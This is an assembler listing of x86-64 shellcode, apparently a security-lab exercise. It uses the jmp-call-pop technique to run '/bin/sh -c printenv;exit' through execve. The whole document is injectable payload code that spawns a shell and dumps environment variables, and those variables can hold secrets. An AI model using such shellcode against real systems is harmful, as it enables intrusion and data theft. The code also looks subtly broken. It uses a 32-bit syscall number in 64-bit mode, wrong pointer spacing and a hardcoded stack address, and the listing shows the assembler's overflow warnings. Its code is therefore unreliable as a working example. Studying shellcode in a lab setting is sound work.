     1                                            bits 64
     2                                              ; find out where we are
     3 00000000 EB5D                    start:     jmp short codeEnd
     4 00000002 5E                      start2:    pop rsi
     5                                              ; clear the a register
     6 00000003 4831C0                             xor rax,rax
     7                                              ; restore null bytes to data
     8 00000006 884607                             mov [byte rsi+flagStr-exeStr-2],al
     9 00000009 88460B                             mov [byte rsi+cmdStr-exeStr-1],al
    10 0000000C 884619                             mov [byte rsi+arrayAddr-exeStr-1],al
    11 0000000F 48894632                           mov [byte rsi+arrayAddr-exeStr+24],rax
    12                                             
    13                                              ; restore argv
    14                                              
    15 00000013 4889761A                           mov [byte rsi + arrayAddr - exeStr],rsi
    16 00000017 488D7E09                           lea rdi,[byte rsi+flagStr-exeStr] 
    17 0000001B 48897E1E                           mov [byte rsi + arrayAddr - exeStr + 4],rdi
    18 0000001F 488D7E0C                           lea rdi, [byte rsi+cmdStr-exeStr]
    19 00000023 48897E22                           mov [byte rsi + arrayAddr - exeStr + 8],rdi
    20                                  
    21                                              ; execve system call
    22 00000027 B00B                               mov al,0x0b
    23 00000029 48BF-                              mov rdi,exeStr
    23 0000002B [6400000000000000] 
    24 00000033 48BE-                              mov rsi,arrayAddr
    24 00000035 [7E00000000000000] 
    25 0000003D 4889E2                             mov rdx,rsp
    26 00000040 48C1EA20                           shr rdx,32
    27 00000044 48C1E220                           shl rdx,32
    28 00000048 480B1425C056FBF7                   or  rdx,[0x7ffff7fb56c0]
    28          ******************       warning: dword data exceeds bounds [-w+number-overflow]
    28          ******************       warning: dword data exceeds bounds [-w+number-overflow]
    29 00000050 488D3A                             lea rdi,[rdx]
    30 00000053 0F05                               syscall
    31                                  
    32                                              ; exit system call
    33 00000055 4889C7                             mov rdi,rax
    34 00000058 B83C000000                         mov rax,0x3c
    35 0000005D 0F05                               syscall
    36                                  
    37 0000005F E89EFFFFFF              codeEnd:   call start2
    38                                              ; data
    39 00000064 2F62696E2F73685879      exeStr:    db "/bin/shXy"
    40 0000006D 2D6358                  flagStr:   db "-cX"
    41 00000070 7072696E74656E763B-     cmdStr:    db "printenv;exitX"
    41 00000079 6578697458         
    42 0000007E FFFFFFFF                arrayAddr: dd 0xffffffffffffffff
    43 00000082 FFFFFFFF                           dd 0xffffffffffffffff
    44 00000086 FFFFFFFF                           dd 0xffffffffffffffff
    45 0000008A FFFFFFFF                           dd 0xffffffffffffffff
    46 0000008E 8E000000                newAddr: dd newAddr-start
